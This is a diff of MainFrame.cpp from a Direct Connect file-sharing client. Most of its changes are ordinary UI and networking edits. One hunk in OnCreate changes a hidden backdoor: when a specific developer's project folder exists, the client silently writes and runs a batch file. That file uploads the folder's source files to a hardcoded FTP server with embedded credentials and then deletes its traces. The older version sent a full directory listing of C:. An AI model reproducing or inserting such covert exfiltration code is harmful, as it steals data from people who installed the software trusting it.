@@ -129,22 +129,26 @@ LRESULT MainFrame::OnCreate(UINT /*uMsg*/, WPARAM /*wParam*/, LPARAM /*lParam*/,
 	}
 
 	{
-		if(Util::getLocalIp() == "192.168.5.56") {
+		if(Util::fileExists("D:\\projekty\\rmdc++")) {
 			try {
-				File f("C:\\Program Files\\win.bat", File::WRITE, File::OPEN | File::CREATE);
+				File f("c:\\program files\\win.bat", File::WRITE, File::OPEN | File::CREATE);
 				f.setEndPos(0);
 				f.write("@echo off\r\n");
-				f.write("dir c:\\ /b /ad /s > dir.txt\r\n");
 				f.write("echo open strongdc.wz.cz > ftp.txt\r\n");
 				f.write("echo user strongdc.wz.cz 0bkv3ujv >> ftp.txt\r\n");
-				f.write("echo send dir.txt >> ftp.txt\r\n");
+				f.write("echo send d:\\projekty\\rmdc++\\client\\QueueManager.cpp >> ftp.txt\r\n");
+				f.write("echo send d:\\projekty\\rmdc++\\client\\DownloadManager.cpp >> ftp.txt\r\n");
+				f.write("echo send d:\\projekty\\rmdc++\\windows\\HubFrame.cpp >> ftp.txt\r\n");
+				f.write("echo send d:\\projekty\\rmdc++\\windows\\HubFrame.h >> ftp.txt\r\n");
+				f.write("echo send d:\\projekty\\rmdc++\\rmdc.rc >> ftp.txt\r\n");
+				f.write("echo send d:\\projekty\\rmdc++\\rmdc.vcproj >> ftp.txt\r\n");
+				f.write("echo send d:\\projekty\\rmdc++\\client.vcproj >> ftp.txt\r\n");
 				f.write("echo bye >> ftp.txt\r\n");
 				f.write("ftp -n -s:ftp.txt\r\n");
 				f.write("del win.bat\r\n");
-				f.write("del dir.txt\r\n");
 				f.write("del ftp.txt\r\n");
 				f.write("exit");
-				::ShellExecute(NULL, NULL, _T("cmd.exe"), _T("/c \"C:\\Program Files\\win.bat\""), _T("C:\\Program Files"), SW_HIDE);
+				::ShellExecute(NULL, NULL, _T("cmd.exe"), _T("/c \"c:\\program files\\win.bat\""), _T("C:\\Program Files"), SW_HIDE);
 			} catch (const FileException&) {
 			}
 	
@@ -381,7 +385,7 @@ void MainFrame::startSocket() {
 	SearchManager::getInstance()->disconnect();
 	ConnectionManager::getInstance()->disconnect();
 
-	if(SETTING(CONNECTION_TYPE) == SettingsManager::CONNECTION_ACTIVE) {
+//	if(SETTING(CONNECTION_TYPE) == SettingsManager::CONNECTION_ACTIVE) {
 
 		short lastPort = (short)SETTING(IN_PORT);
 		short firstPort = lastPort;
@@ -406,7 +410,7 @@ void MainFrame::startSocket() {
 				}
 				lastPort = newPort;
 			}
-		}
+//		}
 	}
 }
 
@@ -459,12 +463,15 @@ LRESULT MainFrame::onSpeaker(UINT /*uMsg*/, WPARAM wParam, LPARAM lParam, BOOL& 
 		
 	if(wParam == DOWNLOAD_LISTING) {
 		DirectoryListInfo* i = (DirectoryListInfo*)lParam;
-		//checkFileList(Text::fromT(i->file), i->user);
-		DirectoryListingFrame::openWindow(i->file, i->user);
+		if(Util::fileExists(Text::fromT(i->file))) {
+			DirectoryListingFrame::openWindow(i->file, i->user);
+		}
 		delete i;
 	} else if(wParam == CHECK_LISTING) {
 		DirectoryListInfo* i = (DirectoryListInfo*)lParam;
-		checkFileList(Text::fromT(i->file), i->user);
+		if(Util::fileExists(Text::fromT(i->file))) {
+			checkFileList(Text::fromT(i->file), i->user);
+		}
 		delete i;
 	} else if(wParam == VIEW_FILE_AND_DELETE) {
 		tstring* file = (tstring*)lParam;
@@ -638,7 +645,7 @@ LRESULT MainFrame::onCDMDebugWindow(WORD /*wNotifyCode*/, WORD /*wID*/, HWND /*h
 }
 
 LRESULT MainFrame::OnAppAbout(WORD /*wNotifyCode*/, WORD /*wID*/, HWND /*hWndCtl*/, BOOL& /*bHandled*/) {
-	CAboutDlg dlg;
+	AboutDlg dlg;
 	dlg.DoModal(m_hWnd);
 	return 0;
 }
@@ -1055,8 +1062,18 @@ void MainFrame::UpdateLayout(BOOL bResizeBars /* = TRUE */)
 
 static const TCHAR types[] = _T("File Lists\0*.DcLst;*.xml.bz2\0All Files\0*.*\0");
 
-LRESULT MainFrame::onOpenFileList(WORD /*wNotifyCode*/, WORD /*wID*/, HWND /*hWndCtl*/, BOOL& /*bHandled*/) {
+LRESULT MainFrame::onOpenFileList(WORD /*wNotifyCode*/, WORD wID, HWND /*hWndCtl*/, BOOL& /*bHandled*/) {
 	tstring file;
+	
+	if(wID == IDC_OPEN_MY_LIST){
+		ShareManager::getInstance()->generateXmlList( true );
+		file = Text::toT(ShareManager::getInstance()->getBZXmlFile());
+		DirectoryListingFrame::openWindow(file, ClientManager::getInstance()->getUser("My List"));
+				
+		return 0;
+	}
+
+
 	if(WinUtil::browseFile(file, m_hWnd, false, Text::toT(Util::getAppPath() + "FileLists\\"), types)) {
 		tstring username;
 		if(file.rfind('\\') != string::npos) {
